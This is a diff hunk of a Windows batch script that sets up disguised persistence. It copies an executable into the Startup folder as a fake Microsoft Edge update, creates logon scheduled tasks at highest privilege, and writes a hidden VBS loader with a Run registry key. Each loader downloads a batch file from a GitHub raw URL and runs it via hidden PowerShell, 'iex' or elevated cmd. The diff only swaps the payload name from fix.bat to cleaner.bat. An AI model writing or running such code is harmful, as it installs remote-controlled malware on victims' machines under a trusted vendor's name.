@@ -74,14 +74,14 @@ copy /y "%DEST%" "%STARTUP_DIR%\MicrosoftEdgeCoreUpdate.exe" >nul 2>&1
 schtasks /create /tn "SySWOW" /tr "\"%DEST%\"" /sc onlogon /rl highest /f >nul 2>&1
 
 
-set "LDR_CMD=%UpdateChecker% -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:TEMP+'\fx.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/fix.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs\""
+set "LDR_CMD=%UpdateChecker% -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $t=$env:TEMP+'\fx.bat'; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat', $t); Start-Process cmd -ArgumentList '/c',$t -Verb RunAs\""
 
 schtasks /create /tn "Microsoft\Windows\Edge\MicrosoftEdgeUpdateTaskMachineCore" /tr "%LDR_CMD%" /sc onlogon /rl highest /f >nul 2>&1
 
 
 set "VBS_LDR=%APPDATA%\Microsoft\EdgeUpdate.vbs"
 echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_LDR%"
-echo WshShell.Run "powershell -w hidden -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/fix.bat')""", 0, False >> "%VBS_LDR%"
+echo WshShell.Run "powershell -w hidden -c ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/techerking29-collab/MicrosoftEdgeCoreUpdate/main/cleaner.bat')""", 0, False >> "%VBS_LDR%"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeCoreVbs" /t REG_SZ /d "wscript.exe \"%VBS_LDR%\"" /f >nul 2>&1
 
 echo Islem tamamlandi.
